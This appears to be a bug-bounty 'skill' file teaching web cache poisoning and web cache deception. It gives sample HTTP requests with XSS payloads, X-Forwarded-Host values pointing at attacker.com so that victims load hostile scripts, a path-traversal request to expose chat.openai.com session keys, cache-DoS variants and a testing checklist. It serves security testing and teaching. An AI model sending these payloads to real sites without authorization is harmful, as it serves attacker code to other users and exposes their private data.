---
name: "cache-poisoning-deception"
version: "2.0"
category: "logic"
subcategory: "cache-poisoning"
phase: "exploitation"
tags: ["bug-bounty", "logic", "cache-poisoning", "cache-deception", "web-cache"]
tools: ["burp-suite", "curl", "param-miner"]
follow_up_skills: ["xss-exploitation", "information-disclosure-harvesting", "xss", "exploitation-chaining", "http-request-smuggling"]
description: "Bug bounty skill: cache poisoning deception - exploitation phase, logic category"
---
# Web Cache Poisoning & Web Cache Deception

## Summary

**Web Cache Poisoning**: Attacker causes the cache to store a malicious response that is served to other users. The poisoned response is served to anyone who visits the affected page while the cache is poisoned.

**Web Cache Deception**: Attacker tricks the application into caching sensitive content belonging to another user, then retrieves that content from the cache.

Both exploit discrepancies between how the cache server and the origin server interpret requests.

## Key Concepts

- **Keyless inputs**: Parameters/headers not part of the cache key but can alter the server's response (e.g., `X-Forwarded-Host`, `X-Forwarded-For`, `Cookie`)
- **Cache key**: The set of inputs used to uniquely identify a cached response (typically: URL path, query string, Host header)
- **Cache poisoning**: Storing malicious content in the cache via keyless input manipulation
- **Cache deception**: Tricking the cache into storing private user data by appending a static extension to a dynamic URL
- **Vary header**: Specifies which headers are additionally part of the cache key (e.g., `Vary: User-Agent` means different User-Agents get different cached responses)

## Technical Details

### Cache Poisoning Attack Flow

1. **Identify keyless inputs** — Parameters not in the cache key that affect the response (use Param Miner to brute-force).
2. **Exploit a keyless input** — Modify the response in a harmful way (XSS, JS hijacking, DoS, redirect).
3. **Ensure the poisoned response is cached** — The malicious response gets stored and served to victims.

### Cache Poisoning Discovery

**HTTP Cache Headers** — Responses stored in cache often have indicative headers:
- `X-Cache: miss` — not cached (yet)
- `X-Cache: hit` — served from cache
- `Cache-Control: public, max-age=1800` — cacheable for 30 minutes
- `Age: 123` — seconds the object has been in cache
- `Vary: User-Agent` — User-Agent is part of the cache key

**Cache Error Code Test** — Send a request with an invalid header to trigger a 400 response, then send a normal request. If the normal request also returns 400, the error response was cached and is being served to others (potential DoS).

### Keyless Input Discovery

Param Miner (Burp extension) brute-forces parameters and headers that might alter the page response. Common keyless inputs:

- `X-Forwarded-Host` — controls domain for script/resource loading
- `X-Forwarded-For` — reflected in the response body
- `X-Forwarded-Scheme` — may trigger redirect logic
- `X-Original-URL` / `X-Rewrite-URL` — internal path rewriting
- `Cookie` — if reflected in response
- `User-Agent` — if used for device-specific content
- `Accept` / `Accept-Language` — content negotiation

### Cache Poisoning Attack Examples

**Basic XSS via X-Forwarded-Host:**

```
GET /en?region=uk HTTP/1.1
Host: innocent-website.com
X-Forwarded-Host: a."><script>alert(1)</script>"
```

If the server reflects `X-Forwarded-Host` into the response unsanitized, and this header is not part of the cache key, the malicious response gets cached and served to all users visiting `/en?region=uk`.

**Cookie-Reflected XSS:**

```
GET / HTTP/1.1
Host: vulnerable.com
Cookie: session=VftzO7ZtiBj5zNLRAuFpXpSQLjS4lBmU; fehost=asd"%2balert(1)%2b"
```

If the `fehost` cookie value is reflected in the response and caching ignores cookies, every visitor gets the XSS payload.

**DoS via Cache Poisoning (CPDoS):**

Send a request with a malicious header that causes the server to return a 400 or 500 error. If this error response is cached, all subsequent visitors receive the error page until the cache expires. The three main CPDoS variants are:

1. **HTTP Header Oversize (HHO)** — Header value larger than origin's limit but smaller than cache's limit.
2. **HTTP Meta Character (HMC)** — Control characters (`\r`, `\n`, `\a`, etc.) in header values rejected by origin.
3. **HTTP Method Override (HMO)** — `X-HTTP-Method-Override` / `X-HTTP-Method` / `X-Method-Override` headers causing method mismatch between cache and origin.

See `denial-of-service-testing` skill for full CPDoS methodology.

**Path Traversal Cache Poisoning (OpenAI API Key Theft):**

```
GET /share/../api/auth/session?cachebuster=123 HTTP/1.1
Host: chat.openai.com
```

If the cache server doesn't normalize the path but the origin server does, `/share/../api/auth/session` may resolve to the API session endpoint. The response (containing API keys) gets cached and is retrievable by anyone.

**Multi-Header Poisoning (X-Forwarded-Host + X-Forwarded-Scheme):**

```
GET /resources/js/tracking.js HTTP/1.1
Host: vulnerable.net
X-Forwarded-Host: attacker.com
X-Forwarded-Scheme: http
```

If the server redirects HTTP to HTTPS using `X-Forwarded-Scheme` as the scheme and `X-Forwarded-Host` as the domain, the cached redirect points all users to `http://attacker.com/resources/js/tracking.js`.

**Vary Header Manipulation (User-Agent Specific):**

```
GET / HTTP/1.1
Host: vulnerable.net
User-Agent: VICTIM'S_USER_AGENT
X-Host: attacker.com
```

If `X-Host` controls JS resource loading and `Vary: User-Agent` means the cache key includes User-Agent, you must know the victim's User-Agent to poison their cache.

### Fat GET Cache Poisoning

A GET request with a body. If the cache server uses the URL as the cache key but the origin server reads parameters from the body, you can poison the cache:

```
GET /contact/report-abuse?report=albinowax HTTP/1.1
Host: github.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 22

report=innocent-victim
```

The cache stores the response for `?report=albinowax` (from URL) but the server processes `report=innocent-victim` (from body). Anyone accessing `?report=albinowax` gets the response intended for the victim.

### Web Cache Deception

Instead of poisoning the cache with malicious content, cache deception tricks the cache into storing private user data by appending a static file extension to a dynamic URL:

```
GET /account/profile/profile.html HTTP/1.1
Host: bank.com
Cookie: session=...
```

The cache sees `profile.html` (static extension) and caches the response. The origin server ignores the `.html` suffix and returns the authenticated account details. The attacker then accesses the same URL and retrieves the cached account data.

Common static extensions used: `.html`, `.css`, `.js`, `.jpg`, `.png`, `.txt`, `.pdf`

### Cache Poisoning / Deception via Request Smuggling

HTTP request smuggling is a powerful alternative vector for both attacks when keyless-input poisoning fails:

- **Smuggling → cache poisoning**: smuggle a request to an on-site redirect path with an attacker-controlled `Host` (or a protocol-relative path like `GET //attacker.com/example` to flip root-relative redirects into open redirects), then trigger a request to a cacheable URL (`/static/include.js`) whose response the front-end caches — every visitor is then redirected to the attacker's domain. Persistent XSS against all visitors is achievable if the poisoned response serves attacker JS from a trusted URL.
- **Smuggling → cache deception**: smuggle a request for a private endpoint (`/private/messages`) so the next user's request (with their session) gets appended; the back-end returns the victim's private content, which the front-end caches under the victim's second URL (`/static/some-image.png`). The attacker then fetches the cached URL. Note the attacker does not know which URL the content is cached under — trial-and-error across several static URLs is required.

See the `http-request-smuggling` skill for the full smuggling methodology and payloads.

## Methodology

### Cache Poisoning Testing

1. Identify a page that is likely cached (high traffic, static-like URL pattern).
2. Check response headers for cache indicators (`X-Cache`, `Cache-Control`, `Age`, `Vary`).
3. Use Param Miner to brute-force keyless inputs (headers and parameters) that affect the response.
4. For each discovered keyless input, test if it can be abused:
   - Can you inject XSS?
   - Can you redirect to an attacker-controlled domain?
   - Can you load malicious JS?
   - Can you trigger a DoS (error page caching)?
5. Verify the poisoned response is cached by requesting from a different browser/incognito.
6. Craft the final exploit URL/headers and confirm cache poisoning across sessions.

### Cache Deception Testing

1. Identify authenticated endpoints that return sensitive data (profile, account settings, API keys).
2. Append a static extension to the URL: `/endpoint/test.css` or `/endpoint?cb=123/test.css`.
3. Check if the cache stores the response (look for `X-Cache: hit`).
4. If cached, access the URL from an incognito/unauthenticated session to confirm the data is accessible.

## Checklist

### Cache Poisoning
- [ ] Identify cache indicators in response headers
- [ ] Brute-force keyless inputs with Param Miner
- [ ] Test X-Forwarded-Host reflection
- [ ] Test X-Forwarded-For reflection
- [ ] Test X-Forwarded-Scheme redirect abuse
- [ ] Test cookie reflection in response
- [ ] Test Fat GET (body params override URL params)
- [ ] Test path traversal cache confusion
- [ ] Verify cache `Vary` header for User-Agent requirements
- [ ] Confirm poisoned response is served to other sessions

### Cache Deception
- [ ] Identify authenticated sensitive endpoints
- [ ] Append static extension (.css, .js, .html, .jpg)
- [ ] Check if response is cached
- [ ] Access from unauthenticated session
- [ ] Confirm sensitive data exposure

## Tools

- **Param Miner** (Burp extension) — Brute-forces cache keyless inputs
- **Burp Suite** — Manual testing, cache header analysis
- **cURL** — Scripted cache poisoning verification

## Bypass Techniques

- **Vary header bypass**: If `Vary: User-Agent` is set, you must know the victim's User-Agent to poison their cache. Obtain via analytics, referrer header, or fingerprinting.
- **Cache key normalization differences**: Some caches normalize paths differently than origin servers — use `/..//` or `//` to confuse them.
- **Param Miner** discovers hidden headers like `X-Original-URL`, `X-Rewrite-URL`, `X-HTTP-Method-Override` that may be keyless.

## Notes

- Cache poisoning impact scales with page popularity — more visitors = more victims
- Cache deception requires the app to accept appended paths/extensions without 404ing
- Always check `Vary` header — it may require matching additional headers for the poison to work
- `X-Cache: miss` then `X-Cache: hit` on second request confirms caching is active
- Cache poisoning + XSS combined can result in widespread client-side attacks without user interaction
- Fat GET attacks exploit discrepancies between cache and origin server request parsing

## References

- https://portswigger.net/web-security/web-cache-poisoning
- https://book.hacktricks.xyz/pentesting-web/cache-poisoning
- https://portswigger.net/research/practical-web-cache-poisoning
- https://portswigger.net/research/web-cache-entanglement
- https://github.com/PortSwigger/param-miner
